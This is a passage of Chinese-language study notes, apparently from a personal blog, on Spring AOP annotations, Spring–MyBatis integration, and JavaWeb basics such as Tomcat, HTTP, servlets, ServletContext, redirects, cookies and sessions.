&lt;aop:before pointcut-ref=&quot;diyPonitcut&quot; method=&quot;before&quot;/&gt; &lt;aop:after pointcut-ref=&quot;diyPonitcut&quot; method=&quot;after&quot;/&gt; &lt;/aop:aspect&gt;&lt;/aop:config&gt; 第三种方式 使用注解实现 第一步：编写一个注解实现的增强类 12345678910111213141516171819202122232425262728package com.she11F.diy;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.After;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Before;@Aspectpublic class AnnotationPointcut &#123; @Before(&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;) public void before()&#123; System.out.println(&quot;---------方法执行前---------&quot;); &#125; @After(&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;) public void after()&#123; System.out.println(&quot;---------方法执行后---------&quot;); &#125; @Around(&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;) public void around(ProceedingJoinPoint jp) throws Throwable &#123; System.out.println(&quot;环绕前&quot;); System.out.println(&quot;签名:&quot;+jp.getSignature()); //执行目标方法proceed Object proceed = jp.proceed(); System.out.println(&quot;环绕后&quot;); System.out.println(proceed); &#125;&#125; 第二步：在Spring配置文件中，注册bean，并增加支持注解的配置 123&lt;!--第三种方式:注解实现--&gt;&lt;bean id=&quot;annotationPointcut&quot; class=&quot;com.kuang.config.AnnotationPointcut&quot;/&gt;&lt;aop:aspectj-autoproxy/&gt; aop:aspectj-autoproxy：说明 1通过aop命名空间的&lt;aop:aspectj-autoproxy /&gt;声明自动为spring容器中那些配置@aspectJ切面的bean创建代理，织入切面。当然，spring 在内部依旧采用AnnotationAwareAspectJAutoProxyCreator进行自动代理的创建工作，但具体实现的细节已经被&lt;aop:aspectj-autoproxy /&gt;隐藏起来了 &lt;aop:aspectj-autoproxy /&gt;有一个proxy-target-class属性，默认为false，表示使用jdk动态代理织入增强，当配为&lt;aop:aspectj-autoproxy poxy-target-class=&quot;true&quot;/&gt;时，表示使用CGLib动态代理技术织入增强。不过即使proxy-target-class设置为false，如果目标类没有声明接口，则spring将自动使用CGLib动态代理。 整合Mybatis步骤： 导入相关jar包 junit 12345&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt;&lt;/dependency&gt; mybatis 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt; mysql数据库 12345&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt;&lt;/dependency&gt; spring相关 12345678910&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.1.10.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.1.10.RELEASE&lt;/version&gt;&lt;/dependency&gt; aop织入器 123456&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt; mybatis-spring整合包【重点】在此还导入了lombok包。 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt;&lt;/dependency&gt; 配置Maven静态资源过滤问题！ 123456789101112&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; 编写配置文件 测试 回忆MyBatis配置 pojo 12345public class User &#123; private int id; //id private String name; //姓名 private String pwd; //密码&#125; 实现mybatis的配置文件 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;typeAliases&gt; &lt;package name=&quot;com.she11F.pojo&quot;/&gt; &lt;/typeAliases&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/test?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;123456&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;package name=&quot;com.she11F.dao&quot;/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 编写UserMapper接口 123public interface UserMapper &#123; public List&lt;User&gt; selectUser();&#125; 编写UserMapper.xml文件 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.kuang.mapper.UserMapper&quot;&gt; &lt;!--sql--&gt; &lt;select id=&quot;selectUser&quot; resultType=&quot;user&quot;&gt; select * from mybatis.user &lt;/select&gt;&lt;/mapper&gt; 测试类 12345678910111213@Testpublic void selectUser() throws IOException &#123; String resource = &quot;mybatis-config.xml&quot;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession sqlSession = sqlSessionFactory.openSession(); UserMapper mapper = sqlSession.getMapper(UserMapper.class); List&lt;User&gt; userList = mapper.selectUser(); for (User user: userList)&#123; System.out.println(user); &#125; sqlSession.close();&#125; 先写到这里吧，先去看 SpringMVC ，Spring 整合 MyBatis 之后重新创建一个项目来看","tags":["java 开发"],"categories":["开发"]},{"title":"JavaWeb 学习","path":"/2024/09/05/java/开发/JavaWeb/","content":"补一补基础 0x01 基本概念1.1 前言静态Web： 提供给所有人看数据不会发生变化！ HTML，CSS 动态Web： 有数据交互，登录账号密码，网站访问人数等 技术栈：Servlet&#x2F;JSP，ASP，PHP 在Java中，动态web资源开发的技术统称为JavaWeb；s 1.2 Web 应用程序Web 应用程序：可以提供浏览器访问的程序； 这个统一的web资源会被放在同一个文件夹下，Web 应用程序 —&gt; Tomcat：服务器一个 Web 应用由多部分组成（静态Web、动态Web） HTML，CSS，JavaScript JSP，Servlet Java 程序 jar 包 配置文件 （Properties） Web 应用程序编写完毕后，若想提供给外界访问：需要一个服务器来统一管理； 1.3 动态 Web 的访问过程浏览器发送 HTTP 请求，服务器 Tomcat 接收请求，Servlet 容器从磁盘加载 Servlet 程序处理请求 request ，处理结束返回 response。 0x02 web服务器2.1 技术讲解ASP: 微软：国内最早流行的就是ASP； 在HTML中嵌入了VB的脚本，ASP+COM； 在ASP开发中，基本一个页面都有几千行的业务代码，页面极其混乱 维护成本高！ C# IIS php: PHP开发速度很快，功能很强大，跨平台，代码很简单（70%，WP） 无法承载大访问量的情况（局限性） JSP&#x2F;Servlet: B&#x2F;S；浏览和服务器C&#x2F;S：客户端和服务器 sun公司主推的B&#x2F;S架构 基于Java语言的（所有的大公司，或者一些开源的组件，都是用Java写的） 可以承载三高问题带来的影响； 语法像ASP，ASP-&gt;JSP，加强市场强度 2.2 web服务器服务器是一种被动的操作，用来处理用户的一些请求和给用户一些响应信息；lIS微软的；ASP，Windows中自带的Tomcat 面向百度编程：Tomcat是Apache 软件基金会（Apache Software Foundation)的jakarta项目中的一个核心项目，最新的Servlet 和JSP 规范总是能在Tomcat中得到体现，因为Tomcat 技术先进、性能稳定，而且免费，因而深受lava爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web应用服务器。 Tomcat 服务器是一个免费的开放源代码的Web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。对于一个Java初学web的人来说，它是最佳的选择 Tomcat 实际上运行JSP页面和Servlet。Tornct最新版易9.0 工作3-5年之后，可以尝试手写Tomcat服务器； 0x03 Tomcat3.1 安装 TomcatTomcat官网：http://tomcat.apache.org/ 3.2 Tomcat 启动和配置文件夹： 启动和关闭 Tomcat： 访问测试：http://localhost:8080/ 可能遇到的问题： 121.Java 环境变量没有配置导致闪退2.乱码问题：可在配置文件中配置 3.3 配置Servlet 核心配置文件目录如下： 可以配置启动的端口号 tomcat的默认端口号为：8080 mysql：3306 http：80 https：443 1234&lt;Connector port=&quot;8081&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;可配置主机名称 默认的主机名为：localhost-&gt;127.0.0.1 默认网站应用存放的位置为：webapps 12&lt;Host name=&quot;www.qinjiang.com&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; 面试题： 在浏览器输入一个域名，回车； 本机查看 C:\\Windows\\System32\\drivers\\etc\\hosts 配置文件是否有相应域名的映射。 ​\tcase1: 若有，则直接映射到对应的 IP 地址，进行访问。 ​\tcase2: 若无，则去 DNS 服务器上查找对应的 IP ，找到就返回相应的 IP，找不到就不返回。 3.4 发布一个 Web 网站网站程序的结构： 1234567891011121314--webapps ：Tomcat服务器的web目录\t-ROOT\t-kuangstudy ：网站的目录名 - WEB-INF -classes : java程序 -lib：web应用所依赖的jar包 -web.xml ：网站配置文件 - index.html 默认的首页 - static -css -style.css -js -img -..... 0x04 HTTP4.1 什么是 HTTP?HTTP(hypertext transport protocol) 超文本传输协议。 文本 ：HTML，字符串… 超文本：图片，音乐，视频，定位，地图… 80 端口 HTTPS（Hyper Text Transfer Protocol over SecureSocket Layer）：是以安全为目标的 HTTP 通道，在 HTTP 的基础上通过传输加密和身份认证保证了传输过程的安全性。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL。 443 端口 4.2 两个时代HTTP 1.0: HTTP&#x2F;1.0：客户端与 Web 服务器连接后，只能获得一个Wen 资源，然后就断开连接，加入某个页面有多个图片资源需要加载，那么需要连接多次，影响服务器和客户端的性能。 HTTP 2.0: HTTP&#x2F;1.1：客户端可以与web服务器连接后，可以获得多个web资源。 HTTP 1.0和HTTP 1.1的主要区别-CSDN博客 4.3 HTTP 请求客户端 -&gt; 发送请求（Request）-&gt;服务器 百度： 1234Request URL:https://www.baidu.com/ 请求地址Request Method:GET get方法/post方法Status Code:200 OK 状态码：200Remote（远程） Address:14.215.177.39:443 12345Accept:text/html Accept-Encoding:gzip, deflate, brAccept-Language:zh-CN,zh;q=0.9 语言Cache-Control:max-age=0Connection:keep-alive 1、请求行 请求行中的请求方式：GET 请求方式：Get，Post，HEAD,DELETE,PUT,TRACT… get：请求能够携带的参数比较少，大小有限制，会在浏览器的URL地址栏显示数据内容，不安全，但高效 post：请求能够携带的参数没有限制，大小没有限制，不会在浏览器的URL地址栏显示数据内容，安全，但不高效。 2、消息头 123456Accept：告诉浏览器，它所支持的数据类型Accept-Encoding：支持哪种编码格式 GBK UTF-8 GB2312 ISO8859-1Accept-Language：告诉浏览器，它的语言环境Cache-Control：缓存控制Connection：告诉浏览器，请求完成是断开还是保持连接HOST：主机..../. 4.4 HTTP 响应服务器 -&gt; 响应（response） -&gt;客户端 百度： 1234Cache-Control:private 缓存控制Connection:Keep-Alive 连接Content-Encoding:gzip 编码Content-Type:text/html 类型 1、响应体 12345678Accept：告诉浏览器，它所支持的数据类型Accept-Encoding：支持哪种编码格式 GBK UTF-8 GB2312 ISO8859-1Accept-Language：告诉浏览器，它的语言环境Cache-Control：缓存控制Connection：告诉浏览器，请求完成是断开还是保持连接HOST：主机..../.Refresh：告诉客户端，多久刷新一次；Location：让网页重新定位； 2、响应状态码 200：请求响应成功 200 3xx：请求重定向 重定向：你重新到我给你新位置去； 4xx：找不到资源 404 5xx：服务器代码错误 500 502:网关错误 常见面试题： 当你的浏览器中地址栏输入地址并回车的一瞬间到页面能够展示回来，经历了什么？ 0x05 Servlet 简介Servlet 就是 Sun 公司开发动态 Web 的一门技术 Sun 在这些 API （Application Programming Interface，应用程序接口）中提供一个接口叫做：Servlet，如果你想开发一个Servlet程序，只需要完成两个小步骤： 编写一个类，实现Servlet接口。 把开发好的Java类部署到web服务器中。 把实现了 Servlet 接口的 Java 程序叫做，Servlet,maven 配置 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.she11F&lt;/groupId&gt; &lt;artifactId&gt;JavaWeb&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 5.1 HelloServletSerlvet 接口 Sun 公司有两个默认的实现类：HttpServlet，GenericServlet 5.2 编写一个Servlet程序 编写一个普通类 实现 Servlet 接口，这里我们直接继承 HttpServlet 12345678910111213141516public class HelloServlet extends HttpServlet &#123; //由于get或者post只是请求实现的不同的方式，可以相互调用，业务逻辑都一样； @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //ServletOutputStream outputStream = resp.getOutputStream(); PrintWriter writer = resp.getWriter(); //响应流 writer.print(&quot;Hello,Serlvet&quot;); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 编写 Servlet 的映射 为什么需要映射：我们写的是 Java 程序，但是要通过浏览器访问，而浏览器需要连接 Web 服务器，所以我们需要再 Web 服务中注册我们写的 Servlet，还需给他一个浏览器能够访问的路径； web.xml 12345678910&lt;!--注册Servlet--&gt;&lt;servlet&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;servlet-class&gt;com.she11f.javaweb.HelloServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;!--Servlet的请求路径--&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 5.3 Servlet原理Servlet是由Web服务器调用，web服务器在收到浏览器请求之后，会： 5.4 Mapping 问题一个 Servlet 可以指定一个映射路径 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 一个 Servlet 可以指定一个映射路径 1234567891011121314151617181920&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello2&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello3&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello4&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello5&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 一个Servlet可以指定通用映射路径 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 默认请求路径 12345&lt;!--默认请求路径--&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 指定一些后缀或者前缀等等…. 12345678&lt;!--可以自定义后缀实现请求映射 注意点，*前面不能加项目映射的路径 hello/sajdlkajda.she11f --&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;*.she11f&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 优先级问题指定了固有的映射路径优先级最高，如果找不到就会走默认的处理请求； 123456789&lt;!--404--&gt;&lt;servlet&gt; &lt;servlet-name&gt;error&lt;/servlet-name&gt; &lt;servlet-class&gt;com.kuang.servlet.ErrorServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;error&lt;/servlet-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 5.5 ServletContextWeb 容器在启动的时候，它会为每个 Web 程序都创建一个对应的 ServletContext 对象，它代表了当前的 Web 应用; 5.5.1共享数据在一个 servlet 中保存的数据，可以在另一个 servlet 中拿到； 123456789101112131415public class HelloServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //this.getInitParameter() 初始化参数 //this.getServletConfig() Servlet配置 //this.getServletContext() Servlet上下文 ServletContext context = this.getServletContext(); String username = &quot;she11f&quot;; //数据 context.setAttribute(&quot;username&quot;,username); //将一个数据保存在了ServletContext中，名字为：username 。值 username &#125;&#125; 123456789101112131415public class GetServlet extends HttpServlet &#123; protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; ServletContext context = this.getServletContext(); String username = (String) context.getAttribute(&quot;username&quot;); resp.setContentType(&quot;text/html&quot;); resp.setCharacterEncoding(&quot;utf-8&quot;); resp.getWriter().print(&quot;名字&quot;+username); &#125; protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 12345678&lt;servlet&gt; &lt;servlet-name&gt;getc&lt;/servlet-name&gt; &lt;servlet-class&gt;com.she11f.javaweb.GetServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;getc&lt;/servlet-name&gt; &lt;url-pattern&gt;/getc&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 先访问 &#x2F;hello 把数据保存在了ServletContext中，然后访问 &#x2F;getc，就能拿到参数了 5.5.2 获取初始化参数1234&lt;context-param&gt; &lt;param-name&gt;url&lt;/param-name&gt; &lt;param-value&gt;makkapakka996.github.io&lt;/param-value&gt;&lt;/context-param&gt; 123456@Overrideprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; ServletContext context = this.getServletContext(); String url = (String) context.getInitParameter(&quot;url&quot;); resp.getWriter().print(&quot;url: &quot; + url);&#125; 5.5.3 请求转发12345678910public class DispatcherTest extends HelloServlet&#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; ServletContext context = this.getServletContext(); System.out.println(&quot;进入了HelloServlet&quot;); //RequestDispatcher requestDispatcher = context.getRequestDispatcher(&quot;/gp&quot;); //转发的请求路径 //requestDispatcher.forward(req,resp); //调用forward实现请求转发； context.getRequestDispatcher(&quot;/hello&quot;).forward(req,resp); &#125;&#125; 5.5.4 读取资源文件Properties 在 java 目录下新建 properties 在 resources 目录下新建 properties发现：都被打包到了同一个路径下：classes，我们俗称这个路径为classpath: 思路：需要一个文件流； 12uername=she11fpassword=123456 123456789101112131415161718192021public class ServletDemo05 extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; InputStream is = this.getServletContext().getResourceAsStream(&quot;/WEB-INF/classes/com/kuang/servlet/aa.properties&quot;); Properties prop = new Properties(); prop.load(is); String user = prop.getProperty(&quot;username&quot;); String pwd = prop.getProperty(&quot;password&quot;); resp.getWriter().print(user+&quot;:&quot;+pwd); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 5.6 HttpServletResponseWeb 服务器接收到客户端的 http 请求，针对这个请求，分别创建一个代表请求的 HttpServletRequest 对象，代表响应的一个 HttpServletResponse； 如果想要获取客户端请求过来的参数：找 HttpServletRequest 如果要给客户端响应一些信息：找 HttpServletResponse 5.6.1 简单分类负责向浏览器发送数据的方法 12ServletOutputStream getOutputStream() throws IOException;PrintWriter getWriter() throws IOException; 责向浏览器发送响应头的方法 void setCharacterEncoding(String var1); void setContentLength(int var1); void setContentLengthLong(long var1); void setContentType(String var1); void setDateHeader(String var1, long var2); void addDateHeader(String var1, long var2); void setHeader(String var1, String var2); void addHeader(String var1, String var2); void setIntHeader(String var1, int var2); void addIntHeader(String var1, int var2); 响应的状态码 1234567891011121314151617181920212223242526272829303132333435363738394041int SC_CONTINUE = 100; int SC_SWITCHING_PROTOCOLS = 101; int SC_OK = 200; int SC_CREATED = 201; int SC_ACCEPTED = 202; int SC_NON_AUTHORITATIVE_INFORMATION = 203; int SC_NO_CONTENT = 204; int SC_RESET_CONTENT = 205; int SC_PARTIAL_CONTENT = 206; int SC_MULTIPLE_CHOICES = 300; int SC_MOVED_PERMANENTLY = 301; int SC_MOVED_TEMPORARILY = 302; int SC_FOUND = 302; int SC_SEE_OTHER = 303; int SC_NOT_MODIFIED = 304; int SC_USE_PROXY = 305; int SC_TEMPORARY_REDIRECT = 307; int SC_BAD_REQUEST = 400; int SC_UNAUTHORIZED = 401; int SC_PAYMENT_REQUIRED = 402; int SC_FORBIDDEN = 403; int SC_NOT_FOUND = 404; int SC_METHOD_NOT_ALLOWED = 405; int SC_NOT_ACCEPTABLE = 406; int SC_PROXY_AUTHENTICATION_REQUIRED = 407; int SC_REQUEST_TIMEOUT = 408; int SC_CONFLICT = 409; int SC_GONE = 410; int SC_LENGTH_REQUIRED = 411; int SC_PRECONDITION_FAILED = 412; int SC_REQUEST_ENTITY_TOO_LARGE = 413; int SC_REQUEST_URI_TOO_LONG = 414; int SC_UNSUPPORTED_MEDIA_TYPE = 415; int SC_REQUESTED_RANGE_NOT_SATISFIABLE = 416; int SC_EXPECTATION_FAILED = 417; int SC_INTERNAL_SERVER_ERROR = 500; int SC_NOT_IMPLEMENTED = 501; int SC_BAD_GATEWAY = 502; int SC_SERVICE_UNAVAILABLE = 503; int SC_GATEWAY_TIMEOUT = 504; int SC_HTTP_VERSION_NOT_SUPPORTED = 505; 5.6.2 下载文件给浏览器输出消息 下载文件 1.要获取下载文件的路径 2.下载的文件名是什么？ 3.设置浏览器使其支持下载的内容 4.获取下载文件的输入流 5.创建缓冲区 6.获取 OutputStream 对象 7.将 FileOutputStream 写入到 buffer缓冲区 8.使用 OutputStream 将缓冲区中的数据输出到客户端 5.6.3 实现重定向Web 资源 B 收到客户端 A 请求后，通知 A 访问另一个 Web 资源 C ，这个过程叫做重定向 面试题：重定向与转发的区别？ 相同点： 页面都会实现跳转不同点： 请求转发的时候，URL 不会发生变化 重定向时候，URL 地址栏会发生变化； 简单实现登录重定向 12345&lt;form action=&quot;$&#123;pageContext.request.contextPath&#125;/login&quot; method=&quot;get&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt; 密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; 12345678910111213public class RequestTest extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //处理请求 String username = req.getParameter(&quot;username&quot;); String password = req.getParameter(&quot;password&quot;); System.out.println(username+&quot;:&quot;+password); //重定向时候一定要注意，路径问题，否则404； resp.sendRedirect(&quot;/JavaWeb_war/success.jsp&quot;); &#125;&#125; 12345678&lt;servlet&gt; &lt;servlet-name&gt;req&lt;/servlet-name&gt; &lt;servlet-class&gt;com.she11f.javaweb.RequestTest&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;req&lt;/servlet-name&gt; &lt;url-pattern&gt;/login&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 5.6.4 HttpServletRequest 获取参数，请求转发HttpServletRequest 代表客户端的请求，用户通过 HTTP 协议访问服务器，HTTP 请求中的所有信息会被封装到 HttpServletRequest ，通过这个HttpServletRequest 的方法，获得客户端的所有信息； 12345678910111213141516171819202122@Overrideprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; req.setCharacterEncoding(&quot;utf-8&quot;); resp.setCharacterEncoding(&quot;utf-8&quot;); String username = req.getParameter(&quot;username&quot;); String password = req.getParameter(&quot;password&quot;); String[] hobbys = req.getParameterValues(&quot;hobbys&quot;); System.out.println(&quot;=============================&quot;); //后台接收中文乱码问题 System.out.println(username); System.out.println(password); System.out.println(Arrays.toString(hobbys)); System.out.println(&quot;=============================&quot;); System.out.println(req.getContextPath()); //通过请求转发 //这里的 / 代表当前的web应用 req.getRequestDispatcher(&quot;/success.jsp&quot;).forward(req,resp);&#125; 0x06 Cookie Session6.1 会话会话：用户打开一个浏览器，点击了很多超链接，访问多个 Web 资源，关闭浏览器，这个过程可以称之为会话； 有状态会话：一个同学来过教室，下次再来教室，我们会知道这个同学，曾经来过，称之为有状态会话； 你能怎么证明你是学生？ 你 学校 发票 学校开的发票 学校登记 校牌 你 学校 发票 学校开的发票 学校的登记 学校给你的校牌 一个网站，怎么证明你来过？ 客户端 服务端 客户端 ： 服务端给客户端一个 信件，客户端下次访问服务端带上信件就可以了； cookie 服务端：服务器登记你来过了，下次你来的时候我来匹配你； seesion 6.2 保存会话的两种技术cookie 客户端技术（响应，请求） session 服务器技术，利用这个技术，可以保存用户的会话信息？可将信息或数据放在 session 中 6.3 Cookie 从请求中拿到 cookie 信息 服务器响应给客户端 cookie 123456Cookie[] cookies = req.getCookies(); //获得Cookiecookie.getName(); //获得cookie中的keycookie.getValue(); //获得cookie中的vlauenew Cookie(&quot;lastLoginTime&quot;, System.currentTimeMillis()+&quot;&quot;); //新建一个cookiecookie.setMaxAge(24*60*60); //设置cookie的有效期resp.addCookie(cookie); //响应给客户端一个cookie cookie ： 一般会保存在本地的用户目录下 appdata ； 一个 Web 站点可以给浏览器发送多个 Cookie，最多存放 20 个 cookie； cookie 大小有限制 4kb； 300 个 cookie 浏览器上限 删除 Cookie； 不设置有效期，关闭浏览器，自动失效； 设置有效期为 0； 编码解码： 12URLEncoder.encode(&quot;秦疆&quot;,&quot;utf-8&quot;)URLDecoder.decode(cookie.getValue(),&quot;UTF-8&quot;) 6.3 Session（重点） 什么是 Session ？ 服务器会给每一个用户（浏览器）创建一个 Session 对象； 一个 Session 独占一个浏览器，只要浏览器没有关闭，这个 Session 就存在； 用户登录之后，整个网站它都可以访问！&#x3D;&gt; 保存用户的信息；保存购物车的信息… Session 和 cookie 的区别： Cookie是把用户的数据写给用户的浏览器，浏览器保存 （可以保存多个） Session把用户的数据写到用户独占Session中，服务器端保存 （保存重要的信息，减少服务器资源的浪费） Session 对象由服务创建； 使用场景： 保存一个登录用户的信息； 购物车信息； 在整个网站中经常会使用的数据，我们将它保存在 Session 中； 使用 Session: 12345678910111213141516171819202122232425262728293031323334public class SessionTest extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //解决乱码问题 req.setCharacterEncoding(&quot;UTF-8&quot;); 